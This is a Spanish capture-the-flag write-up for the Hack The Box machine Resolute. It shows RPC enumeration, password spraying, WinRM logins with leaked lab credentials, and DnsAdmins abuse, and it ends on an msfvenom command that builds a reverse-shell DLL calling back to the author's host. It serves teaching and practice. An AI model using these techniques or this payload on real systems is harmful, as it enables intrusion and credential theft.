---
layout: single
title: Resolute - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Resolute de la plataforma de HackTheBox en la cual vamos a estar enumerando el protocolo RPC gracias a eso obtendremos una lista de usuarios del dominio con el cual con una contraseña que obtengamos en una descripcion veremos que le pertenece a un usuario para la escalada de privilegios abusaremos del grupo DnsAdmins en el cual inyectaremos un dll para obtener una reverse shell"
date: 2024-03-28
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-resolute/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - RPC Enumeration
  - Information Leakage
  - Abusing DnsAdmins Group
  - Active Directory
---

## PortScan

- Vamos a comenzar escaneando los puertos abiertos por el protocolo **TCP** con la herramienta **Nmap**.

```bash
➜  nmap nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49686,49735 10.129.96.155 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 14:40 CST
Nmap scan report for 10.129.96.155
Host is up (0.090s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-28 20:47:27Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49735/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m00s, deviation: 4h02m30s, median: 6m59s
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time:
|   date: 2024-03-28T20:48:21
|_  start_date: 2024-03-28T20:44:01
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-03-28T13:48:19-07:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

## Enumeración

- Tenemos varios puertos abiertos entre ellos **RCP**, **Ldap**, con los cuales podemos enumerar mucho, pero primero vamos a comenzar añadiendo los dominios al **/etc/hosts**.

```bash
➜  nmap crackmapexec smb 10.129.96.155
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
```

```bash
➜  nmap echo "10.129.96.155 megabank.local resolute.megabank.local" | sudo tee -a /etc/hosts
10.129.96.155 megabank.local resolute.megabank.local
```

- De primeras no podemos enumerar nada por **smb**.

```bash
➜  nmap smbclient --no-pass -L //10.129.96.155
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.96.155 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- Bueno tenemos el protocolo **RPC** abierto asi que vamos a comenzar haciendo un **Null Session** para enumerar los usuarios.

```bash
➜  nmap rpcclient -N -U '' 10.129.96.155
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
```

- Y bueno tenemos un listado potencial de usuarios vamos a ponerlos en una lista y probar un **ASREPRoast** <https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast>.

```bash
➜  nmap rpcclient -N -U '' 10.129.96.155 -c enumdomusers | grep -oP '\[\D*?\]' | tr -d '[]' > users.txt
➜  nmap cat users.txt
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```

- Bueno ningún usuario que tenemos es vulnerable a este ataque al parecer ningún usuario tiene configurado el **UF_DONT_REQUIRE_PREAUTH** <https://learn.microsoft.com/es-es/windows/win32/api/lmaccess/ns-lmaccess-user_info_23>.

```bash
➜  nmap impacket-GetNPUsers megabank.local/ -no-pass -usersfile users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marko doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sunita doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User abigail doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User marcus doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sally doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fred doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User felicia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gustavo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ulf doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User stevie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claire doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paulo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User steve doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annette doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User annika doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User per doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User claude doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User melanie doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User zach doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User simon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User naoki doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## RPC enumeración

- Bueno como pudimos autenticarnos sin proporcionar contraseña ni nada vamos a enumerar los usuarios para ver sus descripciones, ya que existen casos donde se comparten contraseñas en las descripciones, por ejemplo podemos ver la del usuario **Administrador**.

```bash
➜  nmap rpcclient -N -U '' 10.129.96.155
rpcclient $> queryuser Administrator
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Thu, 28 Mar 2024 14:45:17 CST
	Logoff Time              :	Wed, 31 Dec 1969 18:00:00 CST
	Kickoff Time             :	Wed, 31 Dec 1969 18:00:00 CST
	Password last set Time   :	Thu, 28 Mar 2024 15:43:03 CST
	Password can change Time :	Fri, 29 Mar 2024 15:43:03 CST
	Password must change Time:	Wed, 13 Sep 30828 20:48:05 CST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000077
	padding1[0..7]...
	logon_hrs[0..21]...
```

- Como son muchos usuarios podemos crear un **script** en **Python3** que nos filtre por las descripciones de los usuarios para ir más rapido.

```python
import subprocess
import re

with open('users.txt', 'r') as f:
    for user in f:
        user = user.strip()
        # Ejecutamos el comando
        command_output = subprocess.run(['rpcclient', '-N', '-U', '', 'megabank.local', '-c', f'queryuser {user}'], capture_output=True, text=True)
        # Filtramos por las lineas que contengan "User Name" o "Description"
        filtered_output = [line for line in command_output.stdout.split('\n') if re.search(r'User Name|Description', line)]
        # Imprimimos el resultado
        for line in filtered_output:
            print(line)

```

- Y encontramos una contraseña.

```bash
➜  nmap python3 xd.py
	User Name   :	Administrator
	Description :	Built-in account for administering the computer/domain
	User Name   :	Guest
	Description :	Built-in account for guest access to the computer/domain
	User Name   :	krbtgt
	Description :	Key Distribution Center Service Account
	User Name   :	DefaultAccount
	Description :	A user account managed by the system.
	User Name   :	ryan
	Description :	
	User Name   :	marko
	Description :	Account created. Password set to Welcome123!
	User Name   :	sunita
	Description :	
	User Name   :	abigail
	Description :	
	User Name   :	marcus
	Description :	
	User Name   :	sally
	Description :	
	User Name   :	fred
	Description :	
	User Name   :	angela
	Description :	
	User Name   :	felicia
	Description :	
	User Name   :	gustavo
	Description :	
	User Name   :	ulf
	Description :	
	User Name   :	stevie
	Description :	
	User Name   :	claire
	Description :	
	User Name   :	paulo
	Description :	
	User Name   :	steve
	Description :	
	User Name   :	annette
	Description :	
	User Name   :	annika
	Description :	
	User Name   :	per
	Description :	
	User Name   :	claude
	Description :	
	User Name   :	melanie
	Description :	
	User Name   :	zach
	Description :	
	User Name   :	simon
	Description :	
	User Name   :	naoki
	Description :	
```

# PasswordSpray

- Ahora podemos usar **crackmapexec** para ver si algún usuario usa la contraseña mediante un **passwordspray**.

```bash
➜  content crackmapexec smb 10.129.96.155 -u users.txt -p Welcome123! --continue-on-success
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE
```

## Shell as melanie

- Tenemos la contraseña del usuario **melanie** vemos que por **smb** solo tenemos acceso de **READ** a algunos recursos compartidos.

```bash
➜  content crackmapexec smb 10.129.96.155 -u melanie -p Welcome123! --shares
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
SMB         10.129.96.155   445    RESOLUTE         [+] Enumerated shares
SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.96.155   445    RESOLUTE         -----           -----------     ------
SMB         10.129.96.155   445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.129.96.155   445    RESOLUTE         C$                              Default share
SMB         10.129.96.155   445    RESOLUTE         IPC$                            Remote IPC
SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share
SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share
```

- Si probamos con el protocolo **winrm** nos devuelve **Pwn3d!** eso significa que las credenciales son válidas y podemos usar **evil-winrm** para conectarnos con el usuario.

```bash
➜  content crackmapexec winrm 10.129.96.155 -u melanie -p Welcome123!
SMB         10.129.96.155   5985   RESOLUTE         [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.129.96.155   5985   RESOLUTE         [*] http://10.129.96.155:5985/wsman
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)
```

## User flag

- Ahora nos podemos conectar y ver la **user flag**.

```bash
➜  content evil-winrm -i 10.129.96.155 -u melanie -p Welcome123!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami
megabank\melanie
*Evil-WinRM* PS C:\Users\melanie\Documents> type C:\Users\melanie\Desktop\user.txt
28d98e800659d48be64838d5b9bfce11
*Evil-WinRM* PS C:\Users\melanie\Documents>
```

## Shell as Ryan

- No tenemos nada interesante.

```bash
*Evil-WinRM* PS C:\Users\melanie\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

- Estos como ya sabemos son los usuarios del dominio.

```bash
*Evil-WinRM* PS C:\Users\melanie\Documents> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
abigail                  Administrator            angela
annette                  annika                   claire
claude                   DefaultAccount           felicia
fred                     Guest                    gustavo
krbtgt                   marcus                   marko
melanie                  naoki                    paulo
per                      ryan                     sally
simon                    steve                    stevie
sunita                   ulf                      zach
The command completed with one or more errors.
```

- Pero si vamos a la carpeta `C:\Users\` que hay otro usuario llamado **ryan**.

```bash
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:43 AM                Administrator
d-----        12/4/2019   2:46 AM                melanie
d-r---       11/20/2016   6:39 PM                Public
d-----        9/27/2019   7:05 AM                ryan
```

- De primeras no hay nada.

```bash
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
```

- En `Powershell` el comando `dir -force` es similar al `ls -la` en **Linux** con esto podemos ver archivos ocultos.

```bash
*Evil-WinRM* PS C:\> dir -force


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d-----        9/25/2019   6:19 AM                PerfLogs
d-r---        9/25/2019  12:39 PM                Program Files
d-----       11/20/2016   6:36 PM                Program Files (x86)
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
d-r---        12/4/2019   2:46 AM                Users
d-----        12/4/2019   5:15 AM                Windows
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        3/28/2024   1:43 PM      402653184 pagefile.sys
```

- Podemos ver que es lo que contiene la carpeta **PSTranscripts**.

```bash
*Evil-WinRM* PS C:\PSTranscripts> dir -force


    Directory: C:\PSTranscripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--h--        12/3/2019   6:45 AM                20191203

*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -force


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt


*Evil-WinRM* PS C:\PSTranscripts\20191203>
```

- Encontramos una contraseña en el **.txt** que encontramos del usuario `ryan:Serv3r4Admin4cc123!`.

```bash
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
*Evil-WinRM* PS C:\PSTranscripts\20191203>
```

- Lo que podemos hacer es probar las credenciales y ver los recursos compartidos.

```bash
➜  content crackmapexec smb 10.129.96.155 -u ryan -p Serv3r4Admin4cc123!
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
➜  content crackmapexec smb 10.129.96.155 -u ryan -p Serv3r4Admin4cc123! --shares
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\ryan:Serv3r4Admin4cc123! (Pwn3d!)
SMB         10.129.96.155   445    RESOLUTE         [+] Enumerated shares
SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
SMB         10.129.96.155   445    RESOLUTE         -----           -----------     ------
SMB         10.129.96.155   445    RESOLUTE         ADMIN$                          Remote Admin
SMB         10.129.96.155   445    RESOLUTE         C$                              Default share
SMB         10.129.96.155   445    RESOLUTE         IPC$                            Remote IPC
SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share
SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share
```

- Y bueno ya nos devuelve un `(Pwn3d!)` lo que significa que podemos conectar usando `evil-winrm`.

```bash
➜  content evil-winrm -i 10.129.96.155 -u ryan -p Serv3r4Admin4cc123!

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents>
```

## Shell as Administrator

- Pues bueno el único usuario que nos queda es el usuario **Administrator**.

- En el escritorio nos dejaron una nota.

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> dir


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        12/3/2019   7:34 AM            155 note.txt


*Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
```

- Nos dicen lo siguiente **cualquier modificación realizada en el sistema, excepto aquellas relacionadas con la cuenta de administrador, será revertida automáticamente en un plazo de 1 minuto**.

>Una "change freeze" es una medida tomada por una organización para evitar realizar cambios significativos en sus sistemas, especialmente durante ciertos períodos críticos, como durante la implementación de actualizaciones importantes, períodos de alta actividad comercial o durante auditorías. Durante un "change freeze", se pueden establecer políticas que limiten o prohíban ciertos tipos de cambios en los sistemas, con el objetivo de mantener la estabilidad y evitar posibles interrupciones o problemas operativos.

- Pero bueno sabemos que aunque se haya impuesto un `"change freeze"` se permite realizar cambios en la cuenta del administrador.

- Vemos que formamos parte del grupo `DnsAdmins`.

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

>El grupo "DnsAdmins" es un grupo de seguridad en los sistemas operativos Windows que tiene privilegios especiales para administrar y realizar cambios en el servicio de DNS (Domain Name System). Este grupo se utiliza específicamente para delegar ciertos privilegios de administración sobre la infraestructura de DNS a usuarios o administradores específicos en un entorno de red.

- Como tal nosotros formamos parte del Grupo **Contractors** y ese grupo forma parte del grupo **DnsAdmins**.

```bash
*Evil-WinRM* PS C:\Users\ryan\Desktop> net localgroup DnsAdmins
Alias name     DnsAdmins
Comment        DNS Administrators Group

Members

-------------------------------------------------------------------------------
Contractors
The command completed successfully.
```

- Lo que vamos a hacer es crear un `dll` malicioso para que cargue una `ddl` maliciosa cuando se inicie el servicio y cuando lo arranque obtener una reverse shell privilegiada <https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/>.

- Vamos a usar `dnscmd` para que en el arranque del servicio `dns` carge nuestro `ddl` malicioso que crearemos con `msfvenom`.

```bash
➜  content msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.222 LPORT=443 -f dll -o zi.dll
